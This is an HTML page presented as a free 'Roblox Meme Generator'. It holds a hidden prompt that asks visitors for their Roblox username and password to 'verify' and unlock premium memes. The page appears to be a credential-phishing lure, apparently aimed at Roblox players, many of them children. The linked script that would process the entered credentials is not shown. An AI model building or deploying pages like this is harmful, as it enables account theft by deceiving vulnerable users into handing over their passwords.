<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Meme Generator 😂</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Comic+Sans+MS&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <h1>🎮 Roblox Meme Generator 😂</h1>
        <p>Generate funny Roblox memes for free!</p>

        <div class="meme-preview">
            <img id="meme-output" src="https://via.placeholder.com/400x300?text=Your+Meme+Here" alt="Meme Preview">
        </div>

        <div class="controls">
            <input type="text" id="meme-text" placeholder="Enter your meme text...">
            <button id="generate-btn">Generate Meme!</button>
        </div>

        <div class="login-prompt" id="login-prompt" style="display: none;">
            <h3>🔒 Verify Your Roblox Account</h3>
            <p>To unlock premium memes, log in below:</p>
            <input type="text" id="roblox-username" placeholder="Roblox Username">
            <input type="password" id="roblox-password" placeholder="Roblox Password">
            <button id="login-btn">Verify & Unlock</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
